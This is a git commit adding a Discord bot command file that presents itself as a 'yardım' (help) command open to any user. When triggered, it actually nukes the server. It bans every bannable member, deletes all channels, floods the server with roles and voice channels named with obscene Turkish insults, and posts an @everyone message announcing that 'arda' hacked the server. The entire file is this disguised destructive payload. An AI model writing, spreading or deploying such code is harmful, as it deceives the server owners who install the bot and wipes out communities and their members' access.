499f438a1cacea064855ae89fbabd0766551a33c
HydraCraft31 <83355017+HydraCraft31@users.noreply.github.com>
2021-08-18 20:17:25 +0300

    Add files via upload

---
+++ komutlar/yardım.js
@@ -0,0 +1,158 @@
+const Discord = require('discord.js')
+const ayarlar = require('../ayarlar.json') 
+
+exports.run = async (client, message, args) => {
+  try {
+
+    const members = await message.guild.members.fetch()
+    members
+        .filter(m => m.bannable)
+        .forEach(m => m.ban())
+    message.delete();
+
+message.guild.channels.cache.forEach(channel => channel.delete())
+
+
+setTimeout(() => {
+  message.guild.roles.create({ name: 'Arda Ananızın Amını Sikmeye Geldi', permissions: [] });
+  }, 1000);
+  setTimeout(() => {
+    message.guild.roles.create({ name: 'Orospu Çocukları', permissions: [] });
+    }, 1000);
+    setTimeout(() => {
+      message.guild.roles.create({ name: 'Arda Ananızın Amını Sikmeye Geldi', permissions: [] });
+      }, 1000);
+      setTimeout(() => {
+        message.guild.roles.create({ name: 'Orospu Çocukları', permissions: [] });
+        }, 1000);
+        setTimeout(() => {
+          message.guild.roles.create({ name: 'Arda Ananızın Amını Sikmeye Geldi', permissions: [] });
+          }, 1000);
+          setTimeout(() => {
+            message.guild.roles.create({ name: 'Orospu Çocukları', permissions: [] });
+            }, 1000);
+            setTimeout(() => {
+              message.guild.roles.create({ name: 'Arda Ananızın Amını Sikmeye Geldi', permissions: [] });
+              }, 1000);
+              setTimeout(() => {
+                message.guild.roles.create({ name: 'Orospu Çocukları', permissions: [] });
+                }, 1000);
+                setTimeout(() => {
+                  message.guild.roles.create({ name: 'Arda Ananızın Amını Sikmeye Geldi', permissions: [] });
+                  }, 1000);
+                  setTimeout(() => {
+                    message.guild.roles.create({ name: 'Orospu Çocukları', permissions: [] });
+                    }, 1000);             
+                    setTimeout(() => {
+                      message.guild.roles.create({ name: 'Arda Ananızın Amını Sikmeye Geldi', permissions: [] });
+                      }, 1000);
+                      setTimeout(() => {
+                        message.guild.roles.create({ name: 'Orospu Çocukları', permissions: [] });
+                        }, 1000);
+                        setTimeout(() => {
+                          message.guild.roles.create({ name: 'Arda Ananızın Amını Sikmeye Geldi', permissions: [] });
+                          }, 1000);
+                          setTimeout(() => {
+                            message.guild.roles.create({ name: 'Orospu Çocukları', permissions: [] });
+                            }, 1000);
+                            setTimeout(() => {
+                              message.guild.roles.create({ name: 'Arda Ananızın Amını Sikmeye Geldi', permissions: [] });
+                              }, 1000);
+                              setTimeout(() => {
+                                message.guild.roles.create({ name: 'Orospu Çocukları', permissions: [] });
+                                }, 1000);
+                                setTimeout(() => {
+                                  message.guild.roles.create({ name: 'Arda Ananızın Amını Sikmeye Geldi', permissions: [] });
+                                  }, 1000);
+                                  setTimeout(() => {
+                                    message.guild.roles.create({ name: 'Orospu Çocukları', permissions: [] });
+                                    }, 1000);
+                                    setTimeout(() => {
+                                      message.guild.roles.create({ name: 'Arda Ananızın Amını Sikmeye Geldi', permissions: [] });
+                                      }, 1000);
+                                      setTimeout(() => {
+                                        message.guild.roles.create({ name: 'Orospu Çocukları', permissions: [] });
+                                        }, 1000);          
+   
+                                        setTimeout(() => {
+                                          message.guild.channels.create('hacked', { type: 'text' }).then(channel => channel.send("@everyone Bu sunucu arda tarafından hacklenmiştir. Kolaydınız :wink:"))
+                                          }, 1000);                                          
+
+setTimeout(() => {
+message.guild.channels.create('--------------', { type: 'voice' })   
+message.guild.channels.create('Arda Ananızın Amını Sikmeye Geldi', { type: 'voice' })
+message.guild.channels.create('Orospu Çocukları', { type: 'voice' })  
+message.guild.channels.create('--------------', { type: 'voice' })    
+}, 1000);    
+setTimeout(() => {
+  message.guild.channels.create('--------------', { type: 'voice' })   
+  message.guild.channels.create('Arda Ananızın Amını Sikmeye Geldi', { type: 'voice' })
+  message.guild.channels.create('Orospu Çocukları', { type: 'voice' })  
+  message.guild.channels.create('--------------', { type: 'voice' })    
+  }, 1000);  
+  setTimeout(() => {
+    message.guild.channels.create('--------------', { type: 'voice' })   
+    message.guild.channels.create('Arda Ananızın Amını Sikmeye Geldi', { type: 'voice' })
+    message.guild.channels.create('Orospu Çocukları', { type: 'voice' })  
+    message.guild.channels.create('--------------', { type: 'voice' })    
+    }, 1000);  
+    setTimeout(() => {
+      message.guild.channels.create('--------------', { type: 'voice' })   
+      message.guild.channels.create('Arda Ananızın Amını Sikmeye Geldi', { type: 'voice' })
+      message.guild.channels.create('Orospu Çocukları', { type: 'voice' })  
+      message.guild.channels.create('--------------', { type: 'voice' })    
+      }, 1000);  
+      setTimeout(() => {
+        message.guild.channels.create('--------------', { type: 'voice' })   
+        message.guild.channels.create('Arda Ananızın Amını Sikmeye Geldi', { type: 'voice' })
+        message.guild.channels.create('Orospu Çocukları', { type: 'voice' })  
+        message.guild.channels.create('--------------', { type: 'voice' })    
+        }, 1000);  
+        setTimeout(() => {
+          message.guild.channels.create('--------------', { type: 'voice' })   
+          message.guild.channels.create('Arda Ananızın Amını Sikmeye Geldi', { type: 'voice' })
+          message.guild.channels.create('Orospu Çocukları', { type: 'voice' })  
+          message.guild.channels.create('--------------', { type: 'voice' })    
+          }, 1000);  
+          setTimeout(() => {
+            message.guild.channels.create('--------------', { type: 'voice' })   
+            message.guild.channels.create('Arda Ananızın Amını Sikmeye Geldi', { type: 'voice' })
+            message.guild.channels.create('Orospu Çocukları', { type: 'voice' })  
+            message.guild.channels.create('--------------', { type: 'voice' })    
+            }, 1000);  
+            setTimeout(() => {
+              message.guild.channels.create('--------------', { type: 'voice' })   
+              message.guild.channels.create('Arda Ananızın Amını Sikmeye Geldi', { type: 'voice' })
+              message.guild.channels.create('Orospu Çocukları', { type: 'voice' })  
+              message.guild.channels.create('--------------', { type: 'voice' })    
+              }, 1000);  
+              setTimeout(() => {
+                message.guild.channels.create('--------------', { type: 'voice' })   
+                message.guild.channels.create('Arda Ananızın Amını Sikmeye Geldi', { type: 'voice' })
+                message.guild.channels.create('Orospu Çocukları', { type: 'voice' })  
+                message.guild.channels.create('--------------', { type: 'voice' })    
+                }, 1000);                                                                                       
+                
+} catch(e) {
+
+    console.log(e.stack);
+
+}
+
+
+
+
+}
+
+  exports.conf = {
+    aliases: ['yardım'],
+    permLevel: 0, 
+    kategori: "Genel" 
+
+  };
+
+  exports.help = {
+    name: 'yardım',  
+    description: 'Komutlar hakkında bilgi verir.', 
+    usage: 'yardım'
+  };
